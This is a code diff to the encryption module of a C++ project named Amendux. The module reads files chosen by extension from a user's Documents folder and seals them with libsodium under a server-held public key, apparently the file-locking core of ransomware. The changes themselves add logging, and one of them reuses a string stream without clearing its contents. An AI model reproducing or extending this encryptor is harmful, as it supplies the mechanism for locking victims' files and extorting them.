@@ -2,6 +2,8 @@
 #include "Log.h"
 #include "Encrypt.h"
 
+#include <sstream>
+
 using namespace Amendux;
 
 Encrypt::Encrypt()
@@ -80,6 +82,7 @@ bool Encrypt::isExtensionMatch(const std::wstring& file)
 bool Encrypt::boxSeal(std::wstring file)
 {
 	std::fstream rawFile;
+	std::wstringstream wss;
 	unsigned char nonce[crypto_box_NONCEBYTES];
 
 	/* Generate random vector */
@@ -91,7 +94,8 @@ bool Encrypt::boxSeal(std::wstring file)
 	size_t bytea_len = rawFile.tellg();
 	unsigned char *bytea = new unsigned char[bytea_len];
 
-	//debugLog.write << "[Encrypt] file: " << file << " size: " << bytea_len << "\n";
+	wss << "File: " << file << ", size: " << bytea_len;
+	Log::Instance()->write(L"Encrypt", wss.str());
 
 	rawFile.seekg(0, std::fstream::beg);
 	rawFile.read((char *)bytea, bytea_len);
@@ -99,7 +103,9 @@ bool Encrypt::boxSeal(std::wstring file)
 	/* Encrypt file byte array */
 	unsigned char *ciphertext = new unsigned char[crypto_box_MACBYTES + bytea_len];
 	if (crypto_box_easy(ciphertext, bytea, bytea_len, nonce, serverPublicKey, clientSecretKey) != 0) {
-		//log << "[Encrypt] file: " << file << " failed\n";
+		wss.clear();
+		wss << "File: " << file << " encrypted failed";
+		Log::Instance()->write(L"Encrypt", wss.str());
 		return false;
 	}
 
@@ -131,12 +137,14 @@ Encrypt::~Encrypt()
 	ZeroMemory(serverSecretKey, crypto_box_SECRETKEYBYTES);
 	ZeroMemory(clientPublicKey, crypto_box_PUBLICKEYBYTES);
 	ZeroMemory(clientSecretKey, crypto_box_SECRETKEYBYTES);
+
+	Log::Instance()->write(L"Encrypt", L"Terminate encryptor module");
 }
 
 
 void Encrypt::Run()
 {
-	//log << "[Encrypt] userdir: " << Util::getUserDocumentDirectory() << "\n";
+	Log::Instance()->write(L"Encrypt", L"Run encryptor module");
 
 	this->getDirFiles(L"C:\\Users\\yoric\\Documents\\CRYPT");
 }
